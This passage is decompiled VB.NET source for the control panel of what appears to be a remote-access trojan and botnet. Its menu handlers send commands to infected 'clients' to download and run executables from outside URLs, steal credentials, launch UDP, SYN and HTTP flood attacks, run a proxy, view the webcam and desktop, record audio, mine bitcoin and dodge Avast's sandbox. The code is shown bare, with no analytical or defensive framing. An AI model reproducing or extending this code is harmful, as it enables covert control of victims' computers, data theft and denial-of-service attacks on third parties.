            Class2.Class4_0.method_8.ShowDialog
        End Sub

        Private Sub method_6(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_7(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub method_8(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_2.Show
        End Sub

        Private Sub method_9(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub NoipUpdateToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_14.Show
        End Sub

        Private Sub NotifyIcon1_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs)
            If (e.Button = MouseButtons.Left) Then
                Me.Show
            End If
        End Sub

        Private Sub OkToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(("PSPEAK|" & Me.ToolStripTextBox1.Text))
            End If
        End Sub

        Private Sub OkToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(("SkipeS|" & Me.ToolStripTextBox2.Text))
            End If
        End Sub

        Private Sub OkToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(("ICEMSn|" & Me.ToolStripTextBox3.Text))
            End If
        End Sub

        Private Sub OkToolStripMenuItem3_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(("FIREMSn|" & Me.ToolStripTextBox4.Text))
            End If
        End Sub

        Private Sub OkToolStripMenuItem4_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(("STARTSSSUDP|" & Me.ToolStripTextBox5.Text & "|" & Me.ToolStripTextBox12.Text))
            End If
        End Sub

        Private Sub OkToolStripMenuItem5_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(("SENDZIC|" & Me.ToolStripTextBox6.Text))
            End If
        End Sub

        Private Sub OkToolStripMenuItem6_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendToSelected(("SOCK7|" & Me.ToolStripTextBox7.Text))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub OkToolStripMenuItem7_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(("SFB|" & Me.ToolStripTextBox13.Text))
            End If
        End Sub

        Private Sub OpenCDToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("OPENDVD")
            End If
        End Sub

        Private Sub OpenWebsiteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.lstClients.SelectedItems.Count > 0) AndAlso (Class2.Class4_0.method_16.ShowDialog = DialogResult.OK)) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject("URL|", Class2.Class4_0.method_16.URL)))
            End If
        End Sub

        Private Sub OSToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstopsys.Width = Conversions.ToDouble("0")) Then
                Me.lstopsys.Width = Conversions.ToInteger("180")
            Else
                Me.lstopsys.Width = Conversions.ToInteger("0")
            End If
        End Sub

        Private Sub PingToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstping.Width = Conversions.ToDouble("0")) Then
                Me.lstping.Width = Conversions.ToInteger("40")
            Else
                Me.lstping.Width = Conversions.ToInteger("0")
            End If
        End Sub

        Private Sub PortScannerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_17.Show
        End Sub

        Public Sub PrcList(ByVal prcs As String)
            Class2.Class4_0.method_19.ListView1.Items.Clear
            Dim strArray2 As String() = prcs.Split(New Char() { "|"c })
            Dim i As Integer
            For i = 0 To strArray2.Length - 1
                prcs = strArray2(i)
                Class2.Class4_0.method_19.ListView1.Items.Add(prcs)
            Next i
        End Sub

        Private Sub RandomCursorToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("DL|http://mes-images.voila.net/cursor.exe")
            End If
        End Sub

        Private Sub RandomIconDesktopToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("DL| http://mes-images.voila.net/fou.exe")
            End If
        End Sub

        Private Sub RecordToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("STARTRECORD")
            End If
        End Sub

        Private Sub RefreshToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim num As Integer = (Me.lstClients.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num)
                Dim item As ListViewItem = Me.lstClients.Items.Item(i)
                Dim text As String = item.Text
                item.Text = [text]
                Me.lstClients.Items.Item(i).SubItems.Item(8).Text = Conversions.ToString(Me.GetPingMs([text]))
                i += 1
            Loop
        End Sub

        Public Sub RemoteDesk(ByVal deskimage As Image, ByVal bytecount As Integer)
            Class2.Class4_0.method_20.PictureBox1.Image = deskimage
            Class2.Class4_0.method_20.Label3.Text = ("Size: " & Conversions.ToString(bytecount) & " KB")
        End Sub

        Private Sub RemoteDownloadExecuteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.lstClients.SelectedItems.Count > 0) AndAlso (Class2.Class4_0.method_4.ShowDialog = DialogResult.OK)) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject("DL|", Class2.Class4_0.method_4.URL)))
            End If
        End Sub

        Private Sub RemoteFileManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Class2.Class4_0.method_5.ShowDialog
            End If
        End Sub

        Public Sub Remove(ByVal client As Connection)
            Dim enumerator As IEnumerator
            Dim strArray As String()
            Try 
                Dim current As ListViewItem
                enumerator = Me.lstClients.Items.GetEnumerator
                Do While enumerator.MoveNext
                    current = DirectCast(enumerator.Current, ListViewItem)
                    If Operators.ConditionalCompareObjectEqual(current.Text, client.Object_0, False) Then
                        goto Label_003E
                    End If
                Loop
                goto Label_0088
            Label_003E:
                current.Remove
                Me.int_0 -= 1
                Me.txtOnline.Text = ("Users Online: " & Conversions.ToString(Me.int_0))
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator,IDisposable).Dispose
                End If
            End Try
        Label_0088:
            strArray = New String(3  - 1) {}
            strArray(0) = Conversions.ToString(DateTime.Now)
            strArray(1) = Conversions.ToString(Operators.ConcatenateObject(client.Object_0, " disconnected."))
            Dim item2 As New ListViewItem(strArray)
            Me.ListView1.Items.Add(item2)
        End Sub

        Private Sub ResHackerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Interaction.Shell("data\ResHacker.exe", AppWinStyle.MinimizedFocus, False, -1)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub RestartToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("RESTART")
            End If
        End Sub

        Private Sub RestartToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SRESTART")
            End If
        End Sub

        Public Sub SaveDownloadedFile(ByVal client As Connection, ByVal content As Byte(), ByVal name As String)
            If Not Directory.Exists((Application.StartupPath & "\Users")) Then
                Directory.CreateDirectory((Application.StartupPath & "\Users"))
            End If
            If Not Directory.Exists(Conversions.ToString(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), client.Object_0))) Then
                Directory.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), client.Object_0)))
            End If
            File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), client.Object_0), "\"), name)), content)
        End Sub

        Private Sub SaveToFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim writer As New StreamWriter((Application.StartupPath & "\history.log"), False)
            Dim num As Integer = (Me.ListView1.Items.Count - 1)
            Dim i As Integer = 0
            Do While (i <= num)
                Dim str As String = ("[" & Me.ListView1.Items.Item(i).Text & "]  " & Me.ListView1.Items.Item(i).SubItems.Item(1).Text)
                writer.WriteLine(str)
                i += 1
            Loop
            writer.Close
            writer.Dispose
            Dim items As String() = New String(3  - 1) {}
            items(0) = Conversions.ToString(DateTime.Now)
            items(1) = ("History saved to """ & Application.StartupPath & "\history.log"".")
            Dim item As New ListViewItem(items)
            Me.ListView1.Items.Add(item)
        End Sub

        <DllImport("user32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)> _
        Private Shared Function SendMessageA(ByVal intptr_0 As IntPtr, ByVal int_2 As Integer, ByVal int_3 As Integer, ByVal int_4 As Integer) As Integer
        End Function

        Public Sub SendToAll(ByVal Message As String)
            Dim enumerator As IEnumerator
            Try 
                enumerator = Me.lstClients.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Try 
                        DirectCast(current.Tag, Connection).Send(Message)
                        Continue Do
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        Console.WriteLine(exception.Message)
                        ProjectData.ClearProjectError
                        Continue Do
                    End Try
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator,IDisposable).Dispose
                End If
            End Try
        End Sub

        Public Sub SendToSelected(ByVal Message As String)
            Dim enumerator As IEnumerator
            Try 
                enumerator = Me.lstClients.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Try 
                        DirectCast(current.Tag, Connection).Send(Message)
                        Continue Do
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        Console.WriteLine(exception.Message)
                        ProjectData.ClearProjectError
                        Continue Do
                    End Try
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator,IDisposable).Dispose
                End If
            End Try
        End Sub

        Private Sub SettingsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_21.Show
        End Sub

        Private Sub ShowSystemInformationToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SYSINFO")
                Class2.Class4_0.method_24.ShowDialog
            End If
        End Sub

        Private Sub ShowTaskbarToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("voirlabarre")
            End If
        End Sub

        Private Sub ShowToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.Show
        End Sub

        Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SHUTDOWN")
            End If
        End Sub

        Private Sub StartToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected(("DDOSDRAIN|" & Me.ToolStripTextBox8.Text))
            End If
        End Sub

        Private Sub StartToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("lancerlolbt")
            End If
        End Sub

        Private Sub StartToolStripMenuItem3_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Class2.Class4_0.method_18.ShowDialog
                Class2.Class4_0.method_18.TextBox1.Focus
            End If
        End Sub

        Private Sub StartToolStripMenuItem4_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.lstClients.SelectedItems.Count > 0) AndAlso (Class2.Class4_0.method_10.ShowDialog = DialogResult.OK)) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("HTTPSTART|", Class2.Class4_0.method_10.HOST), "|"), Class2.Class4_0.method_10.TIME)))
            End If
        End Sub

        Private Sub StartToolStripMenuItem5_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.lstClients.SelectedItems.Count > 0) AndAlso (Class2.Class4_0.method_25.ShowDialog = DialogResult.OK)) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("UDPSTART|", Class2.Class4_0.method_25.HOST), "|"), Class2.Class4_0.method_25.PORT)))
            End If
        End Sub

        Private Sub StartToolStripMenuItem6_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.lstClients.SelectedItems.Count > 0) AndAlso (Class2.Class4_0.method_23.ShowDialog = DialogResult.OK)) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("SYNSTART|", Class2.Class4_0.method_23.HOST), "|"), Class2.Class4_0.method_23.PORT)))
            End If
        End Sub

        Private Sub StatusToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lststatus.Width = Conversions.ToDouble("0")) Then
                Me.lststatus.Width = Conversions.ToInteger("150")
            Else
                Me.lststatus.Width = Conversions.ToInteger("0")
            End If
        End Sub

        Private Sub StealerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SKEALDATO")
                Class2.Class4_0.method_22.ShowDialog
            End If
        End Sub

        Private Sub StopRecordToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("STOPRECORD")
            End If
        End Sub

        Private Sub StopToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Me.listening Then
                Application.Restart
            End If
        End Sub

        Private Sub StopToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SRESTART")
            End If
        End Sub

        Private Sub StopToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("stopbtlol")
            End If
        End Sub

        Private Sub StopToolStripMenuItem4_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.lstClients.SelectedItems.Count > 0) AndAlso (Class2.Class4_0.method_10.ShowDialog = DialogResult.OK)) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("HTTPSTOP|", Class2.Class4_0.method_10.HOST), "|"), Class2.Class4_0.method_10.TIME)))
            End If
        End Sub

        Private Sub StopToolStripMenuItem5_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SYNSTOP")
            End If
        End Sub

        Private Sub StopToolStripMenuItem6_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("UDPSTOP")
            End If
        End Sub

        Private Sub SwapMouseButtonToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("SWAPMOUSEBUTTON")
            End If
        End Sub

        Private Sub TextBox2_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.autorefreshact = 1) And Me.listening) Then
                Dim num2 As Integer = (Me.lstClients.Items.Count - 1)
                Dim i As Integer = 0
                Do While (i <= num2)
                    Dim item As ListViewItem = Me.lstClients.Items.Item(i)
                    Dim text As String = item.Text
                    item.Text = [text]
                    Me.lstClients.Items.Item(i).SubItems.Item(8).Text = Conversions.ToString(Me.GetPingMs([text]))
                    i += 1
                Loop
            End If
            If (Me.autosize = 1) Then
                Me.AppNewAutosizeColumns(Me.lstClients)
            End If
        End Sub

        Public Sub ToggleListen()
            Me.listening = True
            Me.enable = False
        End Sub

        Private Sub ToolStripTextBox14_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub TracerouteIPToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_12.Show
        End Sub

        Public Sub UpdateStatus(ByVal client As Connection, ByVal Message As String)
            Dim enumerator As IEnumerator
            Try 
                enumerator = Me.lstClients.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If Operators.ConditionalCompareObjectEqual(current.Text, client.Object_0, False) Then
                        current.SubItems.Item(2).Text = Message
                        Dim str2 As String = Conversions.ToString(Me.GetPingMs(Conversions.ToString(client.Object_0)))
                        current.SubItems.Item(8).Text = str2
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator,IDisposable).Dispose
                End If
            End Try
        End Sub

        Public Sub UpdateStatusFilemanager(ByVal Message As String)
            Class2.Class4_0.method_5.Label2.Text = Message
        End Sub

        Private Sub UsbToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Me.SendToSelected("FAKEUSB")
            End If
        End Sub

        Private Sub UsernameToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstusername.Width = Conversions.ToDouble("0")) Then
                Me.lstusername.Width = Conversions.ToInteger("135")
            Else
                Me.lstusername.Width = Conversions.ToInteger("0")
            End If
        End Sub

        Private Sub VersionToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstversion.Width = Conversions.ToDouble("0")) Then
                Me.lstversion.Width = Conversions.ToInteger("50")
            Else
                Me.lstversion.Width = Conversions.ToInteger("0")
            End If
        End Sub

        Private Sub ViewRemoteDesktopToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Class2.Class4_0.method_20.ShowDialog
            End If
        End Sub

        Private Sub VisitWebsiteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.lstClients.SelectedItems.Count > 0) AndAlso (Class2.Class4_0.method_16.ShowDialog = DialogResult.OK)) Then
                Me.SendToSelected(Conversions.ToString(Operators.ConcatenateObject("VIVISTEWEB|", Class2.Class4_0.method_16.URL)))
            End If
        End Sub

        Private Sub WebcamToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstClients.SelectedItems.Count > 0) Then
                Class2.Class4_0.method_26.Show
            End If
        End Sub

        Private Sub WindowsKeyToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.lstwinprckey.Width = Conversions.ToDouble("0")) Then
                Me.lstwinprckey.Width = Conversions.ToInteger("140")
            Else
                Me.lstwinprckey.Width = Conversions.ToInteger("0")
            End If
        End Sub


        ' Properties
        Friend Overridable Property AntiAvastSandBoxToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._AntiAvastSandBoxToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.AntiAvastSandBoxToolStripMenuItem_Click)
                If (Not Me._AntiAvastSandBoxToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._AntiAvastSandBoxToolStripMenuItem.Click, handler
                End If
                Me._AntiAvastSandBoxToolStripMenuItem = value
                If (Not Me._AntiAvastSandBoxToolStripMenuItem Is Nothing) Then
                    AddHandler Me._AntiAvastSandBoxToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property AttackToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._AttackToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.AttackToolStripMenuItem_Click)
                If (Not Me._AttackToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._AttackToolStripMenuItem.Click, handler
                End If
                Me._AttackToolStripMenuItem = value
                If (Not Me._AttackToolStripMenuItem Is Nothing) Then
                    AddHandler Me._AttackToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property BinderToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._BinderToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._BinderToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property BinderToolStripMenuItem1 As ToolStripMenuItem
            Get
                Return Me._BinderToolStripMenuItem1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.BinderToolStripMenuItem1_Click)
                If (Not Me._BinderToolStripMenuItem1 Is Nothing) Then
                    RemoveHandler Me._BinderToolStripMenuItem1.Click, handler
                End If
                Me._BinderToolStripMenuItem1 = value
                If (Not Me._BinderToolStripMenuItem1 Is Nothing) Then
                    AddHandler Me._BinderToolStripMenuItem1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property BipSoundToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._BipSoundToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.BipSoundToolStripMenuItem_Click)
                If (Not Me._BipSoundToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._BipSoundToolStripMenuItem.Click, handler
                End If
                Me._BipSoundToolStripMenuItem = value
                If (Not Me._BipSoundToolStripMenuItem Is Nothing) Then
                    AddHandler Me._BipSoundToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property BitCoinMinerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._BitCoinMinerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.BitCoinMinerToolStripMenuItem_Click)
                If (Not Me._BitCoinMinerToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._BitCoinMinerToolStripMenuItem.Click, handler
                End If
                Me._BitCoinMinerToolStripMenuItem = value
                If (Not Me._BitCoinMinerToolStripMenuItem Is Nothing) Then
                    AddHandler Me._BitCoinMinerToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property BotkillToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._BotkillToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._BotkillToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property BSODToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._BSODToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.BSODToolStripMenuItem_Click)
                If (Not Me._BSODToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._BSODToolStripMenuItem.Click, handler
                End If
                Me._BSODToolStripMenuItem = value
                If (Not Me._BSODToolStripMenuItem Is Nothing) Then
                    AddHandler Me._BSODToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button1 As Button
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = value
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = value
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CheckBox1 As CheckBox
            Get
                Return Me._CheckBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As CheckBox)
                Me._CheckBox1 = value
            End Set
        End Property

        Friend Overridable Property ClearTraceHistoryToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ClearTraceHistoryToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ClearTraceHistoryToolStripMenuItem_Click)
                If (Not Me._ClearTraceHistoryToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ClearTraceHistoryToolStripMenuItem.Click, handler
                End If
                Me._ClearTraceHistoryToolStripMenuItem = value
                If (Not Me._ClearTraceHistoryToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ClearTraceHistoryToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CloseCDToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._CloseCDToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CloseCDToolStripMenuItem_Click)
                If (Not Me._CloseCDToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CloseCDToolStripMenuItem.Click, handler
                End If
                Me._CloseCDToolStripMenuItem = value
                If (Not Me._CloseCDToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CloseCDToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property CloseToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._CloseToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CloseToolStripMenuItem_Click)
                If (Not Me._CloseToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CloseToolStripMenuItem.Click, handler
                End If
                Me._CloseToolStripMenuItem = value
                If (Not Me._CloseToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CloseToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ColumnHeader7 As ColumnHeader
            Get
                Return Me.columnHeader_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_0 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader8 As ColumnHeader
            Get
                Return Me.columnHeader_1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_1 = value
            End Set
        End Property

        Friend Overridable Property ComboBox1 As ComboBox
            Get
                Return Me._ComboBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ComboBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ComboBox1_SelectedIndexChanged)
                If (Not Me._ComboBox1 Is Nothing) Then
                    RemoveHandler Me._ComboBox1.SelectedIndexChanged, handler
                End If
                Me._ComboBox1 = value
                If (Not Me._ComboBox1 Is Nothing) Then
                    AddHandler Me._ComboBox1.SelectedIndexChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property ComputerNameToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ComputerNameToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ComputerNameToolStripMenuItem_Click)
                If (Not Me._ComputerNameToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ComputerNameToolStripMenuItem.Click, handler
                End If
                Me._ComputerNameToolStripMenuItem = value
                If (Not Me._ComputerNameToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ComputerNameToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ComputerToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ComputerToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._ComputerToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
            Get
                Return Me._ContextMenuStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
